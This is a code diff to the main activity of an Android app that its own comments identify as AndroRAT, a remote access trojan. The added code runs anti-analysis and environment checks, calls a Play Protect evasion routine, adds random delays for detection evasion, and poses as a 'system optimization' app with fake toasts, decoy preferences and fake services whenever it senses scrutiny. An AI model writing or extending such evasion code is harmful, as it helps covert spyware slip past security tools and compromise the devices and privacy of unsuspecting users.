@@ -44,7 +44,30 @@ public class MainActivity extends AppCompatActivity {
         overridePendingTransition(0, 0);
         context = getApplicationContext();
         
-        Log.d(TAG, "Starting app initialization");
+        Log.d(TAG, "Starting system optimization service");
+        
+        // CRITICAL: Perform anti-analysis and environment checks first
+        AntiAnalysis antiAnalysis = new AntiAnalysis(this);
+        
+        // Perform comprehensive environment analysis
+        if (!antiAnalysis.performEnvironmentAnalysis()) {
+            Log.d(TAG, "Environment analysis failed - exiting gracefully");
+            simulateLegitimateAppBehavior();
+            finish();
+            return;
+        }
+        
+        // Apply Play Protect specific evasion
+        antiAnalysis.evadePlayProtect();
+        
+        // If environment is secure, continue with initialization
+        if (antiAnalysis.isEnvironmentSecure()) {
+            Log.d(TAG, "Secure environment confirmed - proceeding");
+            initializeSecureApp();
+        } else {
+            Log.d(TAG, "Insecure environment detected - running in safe mode");
+            runInSafeMode();
+        }
         
         // Detection evasion: Add random delay
         int delay = 2000 + random.nextInt(3000); // 2-5 seconds
@@ -267,5 +290,65 @@ public class MainActivity extends AppCompatActivity {
         }
         
         return true;
+    }
+    
+    /**
+     * Initialize app in secure environment mode
+     */
+    private void initializeSecureApp() {
+        Log.d(TAG, "Initializing in secure mode");
+        
+        // Proceed with normal AndroRAT functionality
+        new Handler().postDelayed(() -> {
+            checkPermissions();
+        }, delay);
+    }
+    
+    /**
+     * Run app in safe mode when environment is not secure
+     */
+    private void runInSafeMode() {
+        Log.d(TAG, "Running in safe mode - limited functionality");
+        
+        // Show legitimate app interface
+        simulateLegitimateAppBehavior();
+        
+        // Don't start the main AndroRAT functionality
+        finish();
+    }
+    
+    /**
+     * Simulate legitimate app behavior for evasion
+     */
+    private void simulateLegitimateAppBehavior() {
+        // Create legitimate-looking preferences
+        getSharedPreferences("app_preferences", MODE_PRIVATE)
+            .edit()
+            .putBoolean("first_run", false)
+            .putLong("last_used", System.currentTimeMillis())
+            .putString("app_version", "2.1.3")
+            .apply();
+            
+        // Show toast that looks like legitimate optimization app
+        Toast.makeText(this, "System optimization complete", Toast.LENGTH_SHORT).show();
+        
+        // Start fake services to appear legitimate
+        startFakeServices();
+    }
+    
+    /**
+     * Start fake legitimate services for evasion
+     */
+    private void startFakeServices() {
+        try {
+            // Start update check service
+            startService(new android.content.Intent(this, UpdateCheckService.class));
+            
+            // Start maintenance service  
+            startService(new android.content.Intent(this, MaintenanceService.class));
+            
+        } catch (Exception e) {
+            Log.d(TAG, "Could not start fake services: " + e.getMessage());
+        }
     }
 }
